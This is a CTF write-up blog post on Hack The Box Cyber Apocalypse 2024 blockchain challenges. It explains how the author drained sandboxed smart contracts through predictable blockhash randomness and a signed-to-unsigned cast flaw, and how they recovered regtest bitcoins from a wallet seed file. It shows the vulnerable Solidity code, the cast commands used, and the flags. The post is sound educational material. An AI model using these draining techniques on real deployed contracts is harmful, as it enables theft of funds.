---
title: HTB Cyber Apocalypse 2024 Blockchain Challenges
date: 2024-03-14 00:00:00 +0000
categories: [CTF, Blockchain]
tags: [htb, foundry, docker, smartcontracts, solidity]
---

![Hack the Box Cyber Apocalypse CTF 2024 Logo](/assets/img/posts/HTB-Cyber-Apocalypse-2024-Hacker-Royale.jpg){: width="700" height="400" }

## Russian Roulette [very easy]

### Description

`Welcome to The Fray. This is a warm-up to test if you have what it takes to tackle the challenges of the realm. Are you brave enough?`

### Initial Analysis

HTB spawned two Docker containers and provided a `.zip` file containing smart contracts, `Setup.sol` and `RussianRoulette.sol`. I began by looking at `Setup.sol`.

#### Setup.sol

```sol
pragma solidity 0.8.23;

import {RussianRoulette} from "./RussianRoulette.sol";

contract Setup {
    RussianRoulette public immutable TARGET;

    constructor() payable {
        TARGET = new RussianRoulette{value: 10 ether}();
    }

    function isSolved() public view returns (bool) {
        return address(TARGET).balance == 0;
    }
}
```

A smart contract named `RussianRoulette` is created with 10 ether. To solve the challenge, I needed to drain `RussianRoulette` of that 10 ETH into the provided attacker wallet.

#### RussianRoulette.sol

```solidity
pragma solidity 0.8.23;

contract RussianRoulette {

    constructor() payable {
        // i need more bullets
    }

    function pullTrigger() public returns (string memory) {
        if (uint256(blockhash(block.number - 1)) % 10 == 7) {
            selfdestruct(payable(msg.sender)); // 💀
        } else {
		return "im SAFU ... for now";
	    }
    }
}
```

Looking at the `RussianRoulette` contract, I saw the `pullTrigger()` function which has a public state, so I could call it directly. When `pullTrigger()` is called, it:
1. Calculates an unsigned, 256-bit integer from the blockhash of the transaction's block number minus one
2. Modulos that value by 10
3. If the final value is equal to seven, the `selfdestruct()` method is called which deletes the smart contract and sends the remaining Ether to the designated contract (in this case, the transaction sender)

### Solution

Before interacting with the `RussianRoulette` contract, I grabbed the connection information for the hosted testnet and exported these values as environment variables in my Foundry-rs Docker container ([Foundry](https://github.com/foundry-rs/foundry)).

```bash
$ nc 83.136.252.250 40761
1 - Connection information
2 - Restart Instance
3 - Get flag
action? 1

    Private key     :  0xbf72ec411f03738614ea4ff8ca1bedcf5879ca3ce0ed3fa1be876e82ba365e0b
    Address         :  0x23C88A40d138f6eB43C1ae1E439fB37813D13709
    Target contract :  0x8b40383E4793e3C9d4e44db36E878f9D279f0522
    Setup contract  :  0xE7bA09fB42a91B2EbBc893d99dbD8D7C109eaf05

$ export PK=0xbf72ec411f03738614ea4ff8ca1bedcf5879ca3ce0ed3fa1be876e82ba365e0b
$ export ATTACKER=0x23C88A40d138f6eB43C1ae1E439fB37813D13709
$ export TARGET=0x8b40383E4793e3C9d4e44db36E878f9D279f0522
$ export RPC=http://94.237.63.2:43020
```

To get the right block number, I called `pullTrigger()` multiple times (15) using Foundry's `cast` tool to meet the `if` statement condition and trigger the `selfdestruct()` method to send the 10 Ether to my attacker contract.

```bash
$ cast send --private-key $PK -f $ATTACKER --rpc-url $RPC $TARGET "pullTrigger()"

    blockHash               0x0d7f6e70b44066fc8334a5e01e85b3db072fe849c1b450b4b7e9c2acd6dd6fe0
    blockNumber             2
    contractAddress
    cumulativeGasUsed       21720
    effectiveGasPrice       3000000000
    from                    0x19Bd76639019aadBeeA69F5399C49e1672f5e25d
    gasUsed                 21720
    logs                    []
    logsBloom               0x000000000000000000000000...
    root
    status                  1
    transactionHash         0xae0003c575c9e12b54d1e52bae664897021d73cc75e5f0acb0417ca812d6ab5e
    transactionIndex        0
    type                    2
    to                      0x28874aF3728F75792df75680b5c3a9ff1a8C4100
    depositNonce             null

    Repeat...

$ cast send --private-key $PK -f $ATTACKER --rpc-url $RPC $TARGET "pullTrigger()"

    blockHash               0x6ae30317307bf064493418d851a4f8350ec86003067780a035c2260233812ce4
    blockNumber             16
    contractAddress
    cumulativeGasUsed       26358
    effectiveGasPrice       3000000000
    from                    0x19Bd76639019aadBeeA69F5399C49e1672f5e25d
    gasUsed                 26358
    logs                    []
    logsBloom               0x000000000000000000000000...
    root
    status                  1
    transactionHash         0x114d561b016940ac946d493ee46d85e91ee76fea51c062b39857aaa4680920d5
    transactionIndex        0
    type                    2
    to                      0x28874aF3728F75792df75680b5c3a9ff1a8C4100
    depositNonce             null
```

With the `pullTrigger()` condition met, I was able to get the flag.

```bash
$ nc 83.136.252.250 40761
    1 - Connection information
    2 - Restart Instance
    3 - Get flag
    action? 3
    HTB{99%_0f_g4mbl3rs_quit_b4_bigwin}
```

## Recovery [easy]

### Description

`We are The Profits. During a hacking battle our infrastructure was compromised as were the private keys to our Bitcoin wallet that we kept.
We managed to track the hacker and were able to get some SSH credentials into one of his personal cloud instances, can you try to recover my Bitcoins?
Username: satoshi
Password: L4mb0Pr0j3ct
NOTE: Network is regtest, check connection info in the handler first.`

### Initial Analysis
I was provided with an IP with three ports. For the last port, I connected to the server using Netcat and was provided with additional information.

```bash
$ nc 83.136.250.103 42153         
Hello fella, help us recover our bitcoins before it's too late.
Return our Bitcoins to the following address: bcrt1qd5hv0fh6ddu6nkhzkk8q6v3hj22yg268wytgwj
CONNECTION INFO: 
  - Network: regtest
  - Electrum server to connect to blockchain: 0.0.0.0:50002:t

NOTE: These options might be useful while connecting to the wallet, e.g --regtest --oneserver -s 0.0.0.0:50002:t
Hacker wallet must have 0 balance to earn your flag. We want back them all.

Options:
1) Get flag
2) Quit 
```
I need to transfer the stolen Bitcoins contained in the attacker Electrum wallet back to the provided Bitcoin wallet.

### Solution
To access the attacker wallet, I used the credentials provided in the challenge description to set up a remote port forward for port 50002 from my workstation to the attacker's server with one of the other provided IP and ports.

```bash
$ ssh -p 57644 -L 50002:127.0.0.1:50002 satoshi@83.136.250.103
satoshi@83.136.250.103's password: <L4mb0Pr0j3ct>
Linux ng-team-18335-blockchainrecoveryca2024-twdo6-665fbf6cb6-dd26f 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Mar 14 15:01:40 2024 from 10.30.13.14
satoshi@ng-team-18335-blockchainrecoveryca2024-twdo6-665fbf6cb6-dd26f ➜  ~ 
```

Looking in the `satoshi` user's home directory, there's a directory called `wallet` with the `electrum-wallet-seed.txt` file which contains the seed phrase for the attacker's Electrum wallet.

```bash
satoshi@ng-team-18335-blockchainrecoveryca2024-twdo6-665fbf6cb6-dd26f ➜  ~ cat wallet/electrum-wallet-seed.txt 
chapter upper thing jewel merry hammer glass answer machine tag escape fitness
```

With this seed phrase, I installed Electrum on my workstation, connected to the the attacker's Electrum server over my SSH tunnel, and created a new default, standard local wallet with the attacker's seed phrase and connected to the attacker's wallet in the Electrum app to transfer the Bitcoins back to the provided wallet.

```bash
electrum --regtest --oneserver -s 127.0.0.1:50002:telectrum --regtest --oneserver -s 127.0.0.1:50002:t
```

![Screenshot 2024-03-14 at 11.15.36.png](http://localhost:3001/content/images/2024/03/Screenshot-2024-03-14-at-11.15.36.png)

![Screenshot 2024-03-14 at 11.16.06.png](http://localhost:3001/content/images/2024/03/Screenshot-2024-03-14-at-11.16.06.png)

![Screenshot 2024-03-14 at 11.17.08.png](http://localhost:3001/content/images/2024/03/Screenshot-2024-03-14-at-11.17.08.png)

![Screenshot 2024-03-14 at 11.17.38.png](http://localhost:3001/content/images/2024/03/Screenshot-2024-03-14-at-11.17.38.png)

The Bitcoins were returned to the provided wallet, the attacker wallet balance was zero, and I could now acquire the flag.

```bash
$ nc 83.136.250.103 42153
Hello fella, help us recover our bitcoins before it's too late.
Return our Bitcoins to the following address: bcrt1qd5hv0fh6ddu6nkhzkk8q6v3hj22yg268wytgwj
CONNECTION INFO: 
  - Network: regtest
  - Electrum server to connect to blockchain: 0.0.0.0:50002:t

NOTE: These options might be useful while connecting to the wallet, e.g --regtest --oneserver -s 0.0.0.0:50002:t
Hacker wallet must have 0 balance to earn your flag. We want back them all.

Options:
1) Get flag
2) Quit
Enter your choice: 1
HTB{n0t_y0ur_k3ys_n0t_y0ur_c01n5}
```

## Lucky Faucet [easy]

### Description

`The Fray announced the placement of a faucet along the path for adventurers who can overcome the initial challenges. It's designed to provide enough resources for all players, with the hope that someone won't monopolize it, leaving none for others.`

### Initial Analysis
Like the `Russian Roulette` challenge, HTB spawned two Docker containers and provided a .zip file containing smart contracts, `Setup.sol` and `LuckyFaucet.sol`. I began by looking at `Setup.sol`.

### Setup.sol

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;

import {LuckyFaucet} from "./LuckyFaucet.sol";

contract Setup {
    LuckyFaucet public immutable TARGET;

    uint256 constant INITIAL_BALANCE = 500 ether;

    constructor() payable {
        TARGET = new LuckyFaucet{value: INITIAL_BALANCE}();
    }

    function isSolved() public view returns (bool) {
        return address(TARGET).balance <= INITIAL_BALANCE - 10 ether;
    }
}
```

`Setup.sol` creates a new `LuckyFaucet` contract called `TARGET` with the initial balance of 500 ether. To solve the challenge, I needed to transfer at least 10 ether out of the `TARGET` contract to reduce its balance to 490 ether or less.

Next, I examined `LuckyFaucet.sol`.

#### LuckyFaucet.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

contract LuckyFaucet {
    int64 public upperBound;
    int64 public lowerBound;

    constructor() payable {
        // start with 50M-100M wei Range until player changes it
        upperBound = 100_000_000;
        lowerBound =  50_000_000;
    }

    function setBounds(int64 _newLowerBound, int64 _newUpperBound) public {
        require(_newUpperBound <= 100_000_000, "100M wei is the max upperBound sry");
        require(_newLowerBound <=  50_000_000,  "50M wei is the max lowerBound sry");
        require(_newLowerBound <= _newUpperBound);
        // why? because if you don't need this much, pls lower the upper bound :)
        // we don't have infinite money glitch.
        upperBound = _newUpperBound;
        lowerBound = _newLowerBound;
    }

    function sendRandomETH() public returns (bool, uint64) {
        int256 randomInt = int256(blockhash(block.number - 1)); // "but it's not actually random 🤓"
        // we can safely cast to uint64 since we'll never 
        // have to worry about sending more than 2**64 - 1 wei 
        uint64 amountToSend = uint64(randomInt % (upperBound - lowerBound + 1) + lowerBound); 
        bool sent = msg.sender.send(amountToSend);
        return (sent, amountToSend);
    }
}
```

A `LuckyFaucet` contract contains two functions: `setBounds()` and `sendRandomETH()`. `setBounds()`accepts two 64-bit integers as parameters to represent the new `lowerBound` and `upperBound` values where `lowerBound` cannot exceed `upperBound` and the maximum amount of wei for each variable is limited to 50 million wei and 100 million wei respectively. Given there is 10^18^ wei in one ether, the initial bounds are much too small to achieve the goal of transferring 10 ether in a reasonable amount of time. The solution is to figure out a way to make transferring more ether at a team possible. 

### Solution
With `lowerBound` and `upperBound` existing as signed integers or `int64`, a significantly large negative `lowerBound` value can be set and would result in a large `amountToSend` for `sendRandomETH()`. Even if the result of `upperBound - lowerBound + 1) + lowerBound` is a large negative number, the contract casting it to an unsigned integer or `uint64` will result in a positive number.

With this principle in mind, I set up my Foundry-rs Docker container ([Foundry](https://github.com/foundry-rs/foundry)) with the proper environment variables provided by HTB.

```bash
$ nc 94.237.63.2 38694
1 - Connection information
2 - Restart Instance
3 - Get flag
action? 1

Private key     :  0xa26192c31c6a9630bda5f0da49d5910a57ff3d25523ed0daaba2fa86ee34ecf0
Address         :  0x6E4169b7A6c32528D49835CFdb1B4a6a0d27f3Cf
Target contract :  0xEC9a50cbE92645C537d3645e714eDffD85055917
Setup contract  :  0x83630575314cFDdE1C849b4f28B806381b7A67E6

$ export PK=0xa26192c31c6a9630bda5f0da49d5910a57ff3d25523ed0daaba2fa86ee34ecf0
$ export ATTACKER=0x6E4169b7A6c32528D49835CFdb1B4a6a0d27f3Cf
$ export TARGET=0xEC9a50cbE92645C537d3645e714eDffD85055917
$ export RPC=http://94.237.63.2:43020
```

I then used Foundry's `cast` tool to call the `setBounds()` function to create a significantly negative value for `lowerBound` where `lowerBound` was `-10000000000000000` and `upperBound` was `100000000`.

```bash
$ cast send --private-key $PK --rpc-url $RPC $TARGET "setBounds(int64, int64)" -- -10000000000000000 100000000

blockHash               0x61fc9b1c1d3d6cec7be31df01aad0dba01a5d2acaf583e96ae68f4b21f2414de
blockNumber             2
contractAddress
cumulativeGasUsed       27135
effectiveGasPrice       3000000000
from                    0x6E4169b7A6c32528D49835CFdb1B4a6a0d27f3Cf
gasUsed                 27135
logs                    []
logsBloom               0x000000000000000000000000...
root
status                  1
transactionHash         0x66ca28e9a4c26f24fb81841b133306d64f3dc971b858daa18a74404ddc991288
transactionIndex        0
type                    2
to                      0xEC9a50cbE92645C537d3645e714eDffD85055917
depositNonce             null
```

After updating the bounds, I called the `sendRandomETH()` function, which drained at least the required 10 ether from the target contract and allowed me to get the flag.

```bash
$ cast send --private-key $PK -f $ATTACKER --rpc-url $RPC $TARGET "sendRandomETH()"

blockHash               0x9739649d9e6ba6e8c8e39fee837a831de9c5429ed4caa63e8ec8e8a1727a3c5b
blockNumber             3
contractAddress
cumulativeGasUsed       30463
effectiveGasPrice       3000000000
from                    0x6E4169b7A6c32528D49835CFdb1B4a6a0d27f3Cf
gasUsed                 30463
logs                    []
logsBloom               0x000000000000000000000000...
root
status                  1
transactionHash         0xc9d12df171dee3f1cd8f4620d85c22aae557d4ba583910171b9469f219aed354
transactionIndex        0
type                    2
to                      0xEC9a50cbE92645C537d3645e714eDffD85055917
depositNonce             null
```

```bash
$ nc 94.237.63.2 38694
1 - Connection information
2 - Restart Instance
3 - Get flag
action? 3
HTB{1_f0rg0r_s0m3_U}
```

## Ledger Heist [hard]

### Description

`Amidst the dystopian chaos, the LoanPool stands as a beacon for the oppressed, allowing the brave to deposit tokens in support of the cause. Your mission, should you choose to accept it, is to exploit the system's vulnerabilities and siphon tokens from this pool, a daring act of digital subterfuge aimed at weakening the regime's economic stronghold. Success means redistributing wealth back to the people, a crucial step towards undermining the oppressors' grip on power.`

Because I didn't solve Ledger Heist during the challenge, this writeup provides a great solution that I learned from: [chovid99 Ledger Heist](https://chovid99.github.io/posts/cyber-apocalypse-2024-blockchain-hardware/#ledger-heist-hard).